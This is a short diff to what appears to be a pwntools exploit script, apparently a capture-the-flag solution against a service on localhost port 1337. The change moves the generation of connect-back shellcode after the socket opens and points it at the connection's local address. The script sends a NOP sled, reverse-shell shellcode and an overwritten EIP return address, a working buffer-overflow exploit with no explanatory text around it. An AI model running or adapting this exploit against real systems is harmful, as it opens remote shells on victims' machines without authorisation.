@@ -12,11 +12,11 @@ for n in range(50):
     sleep(0.05)
 log.succeeded()
 
-handler = handler(timeout = 1)
-shellcode = asm(connectback('localhost', handler.port))
-
 sock = remote('localhost', 1337, timeout = 1)
 sock.recvuntil('Your output to my input? Do your best!\n')
+
+handler = handler(timeout = 1)
+shellcode = asm(connectback(sock.lhost, handler.port))
 
 eip = p32(0x0804a080)
 sock.send(nops(0xD4 - len(shellcode)) + shellcode + eip + '\n')
